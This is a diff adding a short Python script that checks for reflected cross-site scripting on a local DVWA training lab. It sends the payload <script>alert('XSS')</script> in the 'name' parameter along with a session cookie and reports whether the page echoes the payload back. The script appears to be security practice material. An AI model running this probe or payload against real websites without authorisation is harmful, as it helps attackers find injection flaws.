@@ -1,0 +1,28 @@
+import requests
+
+# URL of the XSS vulnerable page
+url = "http://localhost/DVWA/vulnerabilities/xss_r/"
+
+# XSS payload
+payload = "<script>alert('XSS')</script>"
+
+# Session cookies from browser (after login)
+cookies = {
+    "PHPSESSID": "2aahu1q09f01gg8dr5vc5o187g",  # Replace with your actual cookie
+    "security": "low"
+}
+
+# Parameters sent in the GET request
+params = {
+    "name": payload,
+    "submit": "Submit"
+}
+
+# Send the request
+response = requests.get(url, params=params, cookies=cookies)
+
+# Check if the payload is reflected in the response
+if payload in response.text:
+    print("[+] XSS vulnerability confirmed.")
+else:
+    print("[-] XSS vulnerability not detected.")
